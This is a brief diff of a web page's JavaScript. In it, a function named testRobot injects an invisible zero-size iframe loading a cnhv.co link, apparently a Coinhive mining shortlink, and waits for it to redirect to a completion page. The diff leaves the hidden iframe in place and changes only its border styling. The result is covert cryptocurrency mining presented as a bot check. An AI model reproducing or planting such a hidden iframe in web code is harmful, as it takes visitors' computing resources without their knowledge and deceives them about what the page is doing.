@@ -25,7 +25,7 @@ function advance() {
 }
 
 function testRobot() {
-    document.getElementById("pend").innerHTML = "<iframe id='pendCheck' src='https://cnhv.co/22gwq' width='0' height='0' border='0'></iframe>";
+    document.getElementById("pend").innerHTML = "<iframe id='pendCheck' src='https://cnhv.co/22gwq' width='0' height='0' style='border: none;'></iframe>";
     setInterval(function() {
         try {
             if (document.getElementById("pendCheck").contentWindow.location.href == "https://liveg-technologies.github.io/auroraservice/bbotdone.html") {
